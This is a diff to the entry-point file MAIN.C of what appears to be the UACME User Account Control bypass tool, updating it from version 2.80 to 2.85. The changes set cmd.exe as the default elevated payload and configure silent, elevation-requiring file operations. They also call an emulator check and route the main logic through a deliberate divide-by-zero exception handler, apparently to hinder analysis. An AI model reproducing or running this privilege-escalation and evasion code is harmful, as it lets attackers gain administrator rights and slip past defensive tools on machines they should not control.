@@ -4,9 +4,9 @@
 *
 *  TITLE:       MAIN.C
 *
-*  VERSION:     2.80
+*  VERSION:     2.85
 *
-*  DATE:        07 Sept 2017
+*  DATE:        01 Dec 2017
 *
 *  Program entry point.
 *
@@ -58,7 +58,7 @@ UINT ucmInit(
     TOKEN_ELEVATION_TYPE    ElevType;
 #endif	
 
-    ULONG bytesIO, dwType;
+    ULONG bytesIO;
     WCHAR szBuffer[MAX_PATH + 1];
     WCHAR WndClassName[] = TEXT("reirraC");
     WCHAR WndTitleName[] = TEXT("igakA");
@@ -96,6 +96,11 @@ UINT ucmInit(
         RtlSecureZeroMemory(&g_ctx, sizeof(g_ctx));
 
         g_ctx.IsWow64 = supIsProcess32bit(GetCurrentProcess());
+        g_ctx.ucmHeap = RtlCreateHeap(HEAP_GROWABLE, NULL, 0, 0, NULL, NULL);
+        if (g_ctx.ucmHeap == NULL) {
+            Result = ERROR_NOT_ENOUGH_MEMORY;
+            break;
+        }
 
         if (g_ctx.IsWow64) {
             RtlSecureZeroMemory(&osv, sizeof(osv));
@@ -116,16 +121,9 @@ UINT ucmInit(
             break;
         }
 
-        g_ctx.ucmHeap = RtlCreateHeap(HEAP_GROWABLE, NULL, 0, 0, NULL, NULL);
-        if (g_ctx.ucmHeap == NULL) {
-            Result = ERROR_NOT_ENOUGH_MEMORY;
-            break;
-        }
-
         g_ctx.AkagiFlag = AKAGI_FLAG_KILO;
         inst = NtCurrentPeb()->ImageBaseAddress;
 
-        dwType = 0;
         bytesIO = 0;
         RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
         GetCommandLineParam(GetCommandLine(), 1, szBuffer, MAX_PATH, &bytesIO);
@@ -151,6 +149,10 @@ UINT ucmInit(
             if (ElevType != TokenElevationTypeLimited) {
                 return ERROR_UNSUPPORTED_TYPE;
             }
+        }
+        else {
+            Result = ERROR_INTERNAL_ERROR;
+            break;
         }
 #endif
         //
@@ -181,7 +183,9 @@ UINT ucmInit(
         TempWindow = CreateWindowEx(WS_EX_TOPMOST, WndClassName, WndTitleName,
             WS_VISIBLE | WS_POPUP | WS_CLIPCHILDREN | WS_CLIPSIBLINGS, 0, 0, 30, 30, NULL, NULL, inst, NULL);
 
-        //remember dll handles
+        //
+        // Remember dll handles.
+        //
         g_ctx.hKernel32 = GetModuleHandleW(KERNEL32_DLL);
         if (g_ctx.hKernel32 == NULL) {
             Result = ERROR_INVALID_HANDLE;
@@ -205,19 +209,40 @@ UINT ucmInit(
             }
         }
 
-        //query basic directories
-        _strcpy(g_ctx.szSystemDirectory, USER_SHARED_DATA->NtSystemRoot);
-        _strcat(g_ctx.szSystemDirectory, TEXT("\\system32\\"));
+        //
+        // Query basic directories.
+        //       
+        // 1. SystemRoot
+        // 2. System32
+        if (!supQuerySystemRoot()) {
+            Result = ERROR_PATH_NOT_FOUND;
+            break;
+        }
+        // 3. Temp
         supExpandEnvironmentStrings(L"%temp%\\", g_ctx.szTempDirectory, MAX_PATH);
 
+        //
+        // Default payload path.
+        //
+        _strcpy(g_ctx.szDefaultPayload, g_ctx.szSystemDirectory);
+        _strcat(g_ctx.szDefaultPayload, CMD_EXE);
+
         if (g_ctx.dwBuildNumber > 14997) {
-            g_ctx.IFileOperationFlags = FOF_NOCONFIRMATION | FOFX_NOCOPYHOOKS | FOFX_REQUIREELEVATION;
+            g_ctx.IFileOperationFlags = FOF_NOCONFIRMATION | 
+                FOFX_NOCOPYHOOKS | 
+                FOFX_REQUIREELEVATION;
         }
         else {
-            g_ctx.IFileOperationFlags = FOF_NOCONFIRMATION | FOF_SILENT | FOFX_SHOWELEVATIONPROMPT | FOFX_NOCOPYHOOKS | FOFX_REQUIREELEVATION;
+            g_ctx.IFileOperationFlags = FOF_NOCONFIRMATION | 
+                FOF_SILENT | 
+                FOFX_SHOWELEVATIONPROMPT | 
+                FOFX_NOCOPYHOOKS | 
+                FOFX_REQUIREELEVATION;
         }
 
-        //flashes and sparks
+        //
+        // Flashes and sparks.
+        //
         dc1 = GetDC(TempWindow);
         index = ChoosePixelFormat(dc1, &pfd);
         SetPixelFormat(dc1, index, &pfd);
@@ -316,27 +341,26 @@ UINT ucmMain()
         return GetLastError();
 }
 
-DWORD g_ExCookie = 0;
-
-LONG NTAPI ucmVehHandler(
-    EXCEPTION_POINTERS *ExceptionInfo
+INT ucmSehHandler(
+    _In_ UINT ExceptionCode,
+    _In_ EXCEPTION_POINTERS *ExceptionInfo
 )
 {
     UACME_THREAD_CONTEXT *uctx;
 
-    if (ExceptionInfo->ExceptionRecord->ExceptionCode == STATUS_SINGLE_STEP)
-        if (ExceptionInfo->ExceptionRecord->ExceptionFlags == g_ExCookie) {
-            uctx = (UACME_THREAD_CONTEXT*)RtlGetFrame();
-            while ((uctx != NULL) && (uctx->Frame.Context != &g_fctx)) {
-                uctx = (UACME_THREAD_CONTEXT *)uctx->Frame.Previous;
-            }
-            if (uctx) {
-                if (uctx->ucmMain)
-                    uctx->ReturnedResult = uctx->ucmMain();
-            }
-            ExceptionInfo->ContextRecord->EFlags |= 0x10000;
-            return EXCEPTION_CONTINUE_EXECUTION;
+    UNREFERENCED_PARAMETER(ExceptionInfo);
+
+    if (ExceptionCode == STATUS_INTEGER_DIVIDE_BY_ZERO) {
+        uctx = (UACME_THREAD_CONTEXT*)RtlGetFrame();
+        while ((uctx != NULL) && (uctx->Frame.Context != &g_fctx)) {
+            uctx = (UACME_THREAD_CONTEXT *)uctx->Frame.Previous;
         }
+        if (uctx) {
+            if (uctx->ucmMain)
+                uctx->ReturnedResult = uctx->ucmMain();
+        }
+        return EXCEPTION_EXECUTE_HANDLER;
+    }
     return EXCEPTION_CONTINUE_SEARCH;
 }
 
@@ -350,32 +374,28 @@ LONG NTAPI ucmVehHandler(
 */
 VOID main()
 {
-    PVOID ExceptionHandler;
-    DWORD k;
-    EXCEPTION_RECORD ex;
+    int v = 1, d = 0;
     UACME_THREAD_CONTEXT uctx;
 
     wdCheckEmulatedAPI();
-
+    
     RtlSecureZeroMemory(&uctx, sizeof(uctx));
 
-    ExceptionHandler = RtlAddVectoredExceptionHandler(1, &ucmVehHandler);
-    if (ExceptionHandler) {
-        uctx.Frame.Context = &g_fctx;
-        uctx.ucmMain = (pfnEntryPoint)ucmMain;
-        RtlPushFrame((PTEB_ACTIVE_FRAME)&uctx);
+    uctx.Frame.Context = &g_fctx;
+    uctx.ucmMain = (pfnEntryPoint)ucmMain;
+    RtlPushFrame((PTEB_ACTIVE_FRAME)&uctx);
 
-#pragma warning(suppress: 28159)
-        k = ~GetTickCount();
-        g_ExCookie = RtlRandomEx(&k);
-
-        RtlSecureZeroMemory(&ex, sizeof(ex));
-        ex.ExceptionFlags = g_ExCookie;
-        ex.ExceptionCode = (DWORD)STATUS_SINGLE_STEP;
-        RtlRaiseException(&ex);
-
-        RtlRemoveVectoredExceptionHandler(ExceptionHandler);
-        RtlPopFrame((PTEB_ACTIVE_FRAME)&uctx);
+    __try {
+        v = (int)USER_SHARED_DATA->NtProductType;
+        d = (int)USER_SHARED_DATA->AlternativeArchitecture;
+        v = (int)(v / d);
     }
-    ExitProcess(uctx.ReturnedResult);
+    __except (ucmSehHandler(GetExceptionCode(), GetExceptionInformation())) {
+        v = 1;
+    }
+
+    RtlPopFrame((PTEB_ACTIVE_FRAME)&uctx);   
+    if (v > 0) 
+        ExitProcess(uctx.ReturnedResult);
 }
+
